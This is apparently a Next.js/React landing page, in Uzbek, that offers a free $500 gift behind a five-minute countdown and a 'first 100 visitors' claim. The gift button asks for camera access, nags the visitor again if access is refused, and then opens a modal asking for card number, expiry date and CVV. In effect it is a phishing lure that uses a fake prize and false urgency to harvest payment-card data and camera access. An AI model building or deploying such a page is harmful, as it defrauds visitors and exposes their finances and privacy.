'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import styles from './page.module.css';
import timerStyles from '@/styles/timer.module.css';
import buttonStyles from '@/styles/button.module.css';
import giftStyles from '@/styles/giftIcon.module.css';
import { useCamera } from '@/hooks/useCamera';
import CardModal from '@/components/CardModal';
import PermissionModal from '@/components/PermissionModal';

interface Particle {
  id: number;
  x: number;
  y: number;
  size: number;
  xSpeed: number;
  ySpeed: number;
}

export default function Home() {
  const { requestCamera } = useCamera();

  const [mounted, setMounted] = useState(false);
  const [hours, setHours] = useState('--');
  const [minutes, setMinutes] = useState('--');
  const [seconds, setSeconds] = useState('--');
  const [expired, setExpired] = useState(false);
  const [buttonState, setButtonState] = useState<'idle' | 'processing' | 'success'>('idle');
  const [particles, setParticles] = useState<Particle[]>([]);
  const animationRef = useRef<number | null>(null);
  const timerWrapperRef = useRef<HTMLDivElement>(null);
  const [isTimerExpanded, setIsTimerExpanded] = useState(false);
  const [isCardModalOpen, setIsCardModalOpen] = useState(false);
  const [isPermissionModalOpen, setIsPermissionModalOpen] = useState(false);
  const [progress, setProgress] = useState(100);
  const [clockRotation, setClockRotation] = useState(0);
  const [timerEndTime, setTimerEndTime] = useState<number | null>(null);

  const TIMER_DURATION = 5 * 60 * 1000;

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (timerWrapperRef.current && !timerWrapperRef.current.contains(event.target as Node)) {
        setIsTimerExpanded(false);
      }
    };
    if (isTimerExpanded) {
      document.addEventListener('click', handleClickOutside);
    }
    return () => document.removeEventListener('click', handleClickOutside);
  }, [isTimerExpanded]);

  useEffect(() => {
    setMounted(true);
    setTimerEndTime(Date.now() + TIMER_DURATION);
  }, []);

  useEffect(() => {
    if (!mounted || !timerEndTime) return;

    const updateTimer = () => {
      const now = Date.now();
      const diff = timerEndTime - now;

      if (diff <= 0) {
        setExpired(true);
        setProgress(0);
        setClockRotation(360);
        setHours('00');
        setMinutes('00');
        setSeconds('00');
        return;
      }

      const h = Math.floor(diff / (1000 * 60 * 60));
      const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const s = Math.floor((diff % (1000 * 60)) / 1000);

      setHours(h.toString().padStart(2, '0'));
      setMinutes(m.toString().padStart(2, '0'));
      setSeconds(s.toString().padStart(2, '0'));

      const remaining = (diff / TIMER_DURATION) * 100;
      setProgress(Math.max(0, Math.min(100, remaining)));

      const elapsed = TIMER_DURATION - diff;
      const rotation = (elapsed / TIMER_DURATION) * 360;
      setClockRotation(Math.min(360, rotation));
    };

    updateTimer();
    const interval = setInterval(updateTimer, 100);
    return () => clearInterval(interval);
  }, [mounted, timerEndTime]);

  useEffect(() => {
    const initialParticles: Particle[] = Array.from({ length: 15 }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 5 + 2,
      xSpeed: (Math.random() - 0.5) * 0.3,
      ySpeed: (Math.random() - 0.5) * 0.3,
    }));
    setParticles(initialParticles);
  }, []);

  useEffect(() => {
    if (particles.length === 0) return;

    const animate = () => {
      setParticles(prev => prev.map(particle => {
        let newX = particle.x + particle.xSpeed;
        let newY = particle.y + particle.ySpeed;
        let newXSpeed = particle.xSpeed;
        let newYSpeed = particle.ySpeed;

        if (newX <= 0 || newX >= 100) newXSpeed *= -1;
        if (newY <= 0 || newY >= 100) newYSpeed *= -1;

        return { ...particle, x: newX, y: newY, xSpeed: newXSpeed, ySpeed: newYSpeed };
      }));
      animationRef.current = requestAnimationFrame(animate);
    };

    animationRef.current = requestAnimationFrame(animate);
    return () => {
      if (animationRef.current) cancelAnimationFrame(animationRef.current);
    };
  }, [particles.length]);

  const handleClick = useCallback(async () => {
    if (buttonState !== 'idle') return;
    setButtonState('processing');

    const success = await requestCamera();

    if (success) {
      setButtonState('success');
      setIsCardModalOpen(true);
    } else {
      setButtonState('idle');
      setIsPermissionModalOpen(true);
    }
  }, [buttonState, requestCamera]);

  const handleRetryPermission = useCallback(async () => {
    setIsPermissionModalOpen(false);
    setButtonState('processing');

    const success = await requestCamera();

    if (success) {
      setButtonState('success');
      setIsCardModalOpen(true);
    } else {
      setButtonState('idle');
      setIsPermissionModalOpen(true);
    }
  }, [requestCamera]);

  const handleCardSubmit = useCallback(async (cardData: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardType: string;
  }) => {
    console.log('Card submitted:', cardData);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsCardModalOpen(false);
  }, []);

  const getButtonContent = () => {
    switch (buttonState) {
      case 'processing':
        return <><i className="fas fa-spinner fa-spin" /> Kuting...</>;
      case 'success':
        return <><i className="fas fa-spinner fa-spin" /> Sovg&apos;angiz yuklanmoqda...</>;
      default:
        return <><i className="fas fa-gem" /> Bepul $500 sovg&apos;a olish</>;
    }
  };

  const buttonClassName = [
    buttonStyles.ctaButton,
    buttonState === 'processing' ? buttonStyles.processing : '',
    buttonState === 'success' ? buttonStyles.success : '',
  ].filter(Boolean).join(' ');

  const handleTimerClick = useCallback(() => setIsTimerExpanded(prev => !prev), []);

  const timerClassName = [
    timerStyles.timer,
    isTimerExpanded ? timerStyles.expanded : ''
  ].filter(Boolean).join(' ');

  const radius = 12;
  const circumference = 2 * Math.PI * radius;

  return (
    <div className={styles.heroSection}>
      <div ref={timerWrapperRef} className={timerStyles.timerWrapper} onClick={handleTimerClick}>
        <div className={timerClassName}>
          {expired ? (
            <span className={timerStyles.timerExpired}>Taklif muddati tugadi</span>
          ) : (
            <>
              <div className={timerStyles.timerCollapsed}>
                <span className={timerStyles.timerSpan}>{hours}</span>:
                <span className={timerStyles.timerSpan}>{minutes}</span>:
                <span className={timerStyles.timerSpan}>{seconds}</span>
              </div>

              <div className={timerStyles.timerExpanded}>
                <span className={timerStyles.timerLabel}>Taklif tugaydi</span>
                <div className={timerStyles.timerIconWrapper}>
                  <div className={timerStyles.clockIcon}>
                    <svg className={timerStyles.progressRing} viewBox="0 0 28 28">
                      <circle cx="14" cy="14" r={radius} fill="none" stroke="#3a3a3a" strokeWidth="2" />
                      <circle
                        className={timerStyles.progressRingRemaining}
                        cx="14" cy="14" r={radius}
                        fill="none" stroke="#d4af37" strokeWidth="2.5" strokeLinecap="round"
                        strokeDasharray={circumference}
                        strokeDashoffset={-(clockRotation / 360) * circumference}
                        style={{
                          transform: 'rotate(-90deg)',
                          transformOrigin: 'center',
                          filter: 'drop-shadow(0 0 3px rgba(212, 175, 55, 0.6))',
                          transition: 'stroke-dashoffset 0.1s linear'
                        }}
                      />
                      <circle
                        className={timerStyles.sparkle}
                        cx={14 + radius * Math.cos((clockRotation - 90) * Math.PI / 180)}
                        cy={14 + radius * Math.sin((clockRotation - 90) * Math.PI / 180)}
                        r="2" fill="#fff"
                        style={{
                          filter: 'drop-shadow(0 0 4px #d4af37) drop-shadow(0 0 8px #fff)',
                          opacity: progress > 0 ? 1 : 0
                        }}
                      />
                    </svg>
                    <div className={timerStyles.clockHand} style={{ transform: `rotate(${clockRotation}deg)` }} />
                  </div>
                  <div className={timerStyles.timerDigits}>
                    <span className={timerStyles.timerSpan}>{hours}</span>
                    <span className={timerStyles.timerSeparator}>:</span>
                    <span className={timerStyles.timerSpan}>{minutes}</span>
                    <span className={timerStyles.timerSeparator}>:</span>
                    <span className={timerStyles.timerSpan}>{seconds}</span>
                  </div>
                </div>
              </div>
            </>
          )}
        </div>
      </div>

      <div className={`${styles.decorativeCircle} ${styles.circle1}`} />
      <div className={`${styles.decorativeCircle} ${styles.circle2}`} />

      {particles.map(particle => (
        <div
          key={particle.id}
          className={styles.particle}
          style={{ width: particle.size, height: particle.size, top: `${particle.y}vh`, left: `${particle.x}vw` }}
        />
      ))}

      <div className={styles.contentContainer}>
        <div className={giftStyles.giftIcon}>
          <i className="fas fa-gift" />
        </div>

        <div className={styles.offerBadge}>
          <i className="fas fa-crown" /> CHEKLANGAN TAKLIF
        </div>

        <h1 className={styles.title}>
          Eksklyuziv sovg&apos;angizni<br />
          <span className={styles.highlight}>Bepul oling</span> hozir
        </h1>

        <p className={styles.subheadline}>
          Cheklangan taklif – faqat bugungi birinchi 100 ta tashrif buyuruvchi uchun.{' '}
          <strong>Xarid talab qilinmaydi.</strong> Vaqt tugashidan oldin sovg&apos;angizni oling.
        </p>

        <button className={buttonClassName} onClick={handleClick}>
          {getButtonContent()}
        </button>
      </div>

      <CardModal
        isOpen={isCardModalOpen}
        onClose={() => setIsCardModalOpen(false)}
        onSubmit={handleCardSubmit}
      />

      <PermissionModal
        isOpen={isPermissionModalOpen}
        onClose={() => setIsPermissionModalOpen(false)}
        onRetry={handleRetryPermission}
      />
    </div>
  );
}
